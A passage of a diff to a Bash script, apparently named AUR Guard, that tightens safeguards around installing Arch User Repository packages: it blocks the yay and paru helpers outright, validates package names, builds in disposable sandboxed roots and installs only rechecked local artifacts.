     _aur_guard_fail 'self-test failed: explicitly scanned dependency cache was excluded'
     return 1
   fi
-  printf '%s
-' "$wrapper_output"
+  printf '%s\n' "$wrapper_output"
 
   mkdir -p "$test_root/benign-source"
   cat > "$test_root/benign-source/reference.sh" <<'AUR_GUARD_TEST_REFERENCE'
@@ -1862,7 +2723,7 @@ AUR_GUARD_TEST_REFERENCE
     return 1
   fi
 
-  _aur_guard_pass 'dry-run passed: emergency blocks, historical quarantine, dependency evidence, source scanning, and no-crawl behavior worked'
+  _aur_guard_pass 'dry-run passed: emergency blocks, unconditional helper blocking, package-name validation, strong source integrity, dependency evidence, source scanning, and no-crawl behavior worked'
 )
 
 aurhelp() {
@@ -1870,12 +2731,8 @@ aurhelp() {
 AUR Guard quick help
 
 Blocked:
-  yay
-  yay -S package
-  yay -Syu
-  paru
-  paru -S package
-  paru -Syu
+  Every direct yay command
+  Every direct paru command
 
 Safe workflow:
   sysupdate             update enabled pacman repository packages
@@ -1901,12 +2758,13 @@ Important:
   The downloaded incident lists are historical affected-package records.
   Historical and dependency-context warnings require explicit install confirmation.
   Only the built-in emergency list and current malicious patterns hard-block installation.
-  PKGBUILD metadata, source downloads, and source extraction run inside bubblewrap.
-  Every requested or dependent AUR PKGBUILD and downloaded source tree is scanned.
-  Suspicious Bun/npm/pnpm/yarn dependencies must match upstream project manifests.
-  Dependency caches are prepared in a restricted network sandbox, then prepare(), build(), check(), and package() run offline.
-  Built package artifacts are scanned and installed directly with pacman -U.
-  Source verification proves sources match the PKGBUILD declarations.
+  AUR RPC, Git, helper update checks, source downloads, and PKGBUILD execution are sandboxed.
+  Network-enabled sandboxes block loopback, LAN, link-local, Tailscale CGNAT, and multicast ranges.
+  Build dependencies and earlier AUR artifacts exist only inside disposable clean Arch roots.
+  prepare() runs in the restricted public-network sandbox; build(), check(), and package() run with no network.
+  Pacman install scripts, setuid/setgid files, capabilities, special files, and privileged auto-activation paths are blocked.
+  Every final artifact is scanned, hashed, rechecked, and installed in one pacman transaction.
+  Source verification requires strong checksums, exact VCS commits, or matching signatures pinned by validpgpkeys.
   Pattern scanning still cannot prove that upstream source code is harmless.
 AUR_GUARD_HELP
 }
@@ -1923,11 +2781,18 @@ aurcheck() {
     _aur_guard_fail 'no yay or paru found'
     return 127
   }
-
   _aur_guard_refresh_blacklists || return 1
   _AUR_GUARD_HISTORICAL_MATCHES=()
 
-  output=$(command "$helper" -Qua) || return $?
+  local helper_work
+  helper_work=$(mktemp -d) || return 1
+  output=$(
+    _aur_guard_sandbox_exec "$helper_work" allow writable / \
+      "$helper" -Qua
+  )
+  local helper_status=$?
+  rm -rf "$helper_work"
+  (( helper_status == 0 )) || return "$helper_status"
   if [[ -z "$output" ]]; then
     printf 'No AUR updates available.\n'
     return 0
@@ -1973,6 +2838,7 @@ aurverify() {
   fi
 
   pkg="$1"
+  _aur_guard_validate_package_name "$pkg" || return 1
 
   if command pacman -Si "$pkg" >/dev/null 2>&1; then
     local repo_name
@@ -2016,6 +2882,7 @@ aurup() {
   fi
 
   pkg="$1"
+  _aur_guard_validate_package_name "$pkg" || return 1
 
   if command pacman -Si "$pkg" >/dev/null 2>&1; then
     local repo_name
@@ -2048,25 +2915,31 @@ aurup() {
     return 1
   fi
 
+  if ! _aur_guard_build_verified_artifacts "$pkg"; then
+    _aur_guard_refuse_install "$pkg" 'clean-root cache preparation, offline build/test, or artifact inspection failed'
+    _aur_guard_cleanup_work
+    return 1
+  fi
+
+  if ! _aur_guard_recheck_commits; then
+    _aur_guard_refuse_install "$pkg" 'an AUR package changed after its artifact was built'
+    _aur_guard_cleanup_work
+    return 1
+  fi
+
   if ! _aur_guard_confirm_guarded_install "$pkg"; then
     _aur_guard_refuse_install "$pkg" 'required warning confirmation was not accepted'
     _aur_guard_cleanup_work
     return 1
   fi
 
-  if ! _aur_guard_install_repo_dependencies; then
-    _aur_guard_refuse_install "$pkg" 'repository dependency installation failed'
+  if ! _aur_guard_install_verified_transaction "$pkg"; then
+    _aur_guard_refuse_install "$pkg" 'the final verified pacman transaction failed'
     _aur_guard_cleanup_work
     return 1
   fi
 
-  if ! _aur_guard_build_and_install_verified "$pkg"; then
-    _aur_guard_refuse_install "$pkg" 'cache preparation, offline build/test, artifact inspection, or local installation failed'
-    _aur_guard_cleanup_work
-    return 1
-  fi
-
-  _aur_guard_pass "$pkg was built and tested from the exact verified AUR checkout, then installed from the inspected local artifact."
+  _aur_guard_pass "$pkg and every required AUR dependency were built in disposable clean roots and installed from reverified local artifacts."
   _aur_guard_cleanup_work
 }
 
@@ -2105,33 +2978,11 @@ aurunsafe() {
 }
 
 yay() {
-  if _aur_guard_has_unsafe_flag "$@"; then
-    printf 'AUR Guard blocked unsafe yay flags. Use aurhelp.\n' >&2
-    return 1
-  fi
-
-  if _aur_guard_is_mass_update "$@" \
-      || _aur_guard_is_sync_install "$@" \
-      || _aur_guard_has_default_install_search "$@"; then
-    _aur_guard_block_message yay
-    return 1
-  fi
-
-  command yay "$@"
+  _aur_guard_block_message yay
+  return 1
 }
 
 paru() {
-  if _aur_guard_has_unsafe_flag "$@"; then
-    printf 'AUR Guard blocked unsafe paru flags. Use aurhelp.\n' >&2
-    return 1
-  fi
-
-  if _aur_guard_is_mass_update "$@" \
-      || _aur_guard_is_sync_install "$@" \
-      || _aur_guard_has_default_install_search "$@"; then
-    _aur_guard_block_message paru
-    return 1
-  fi
-
-  command paru "$@"
+  _aur_guard_block_message paru
+  return 1
 }
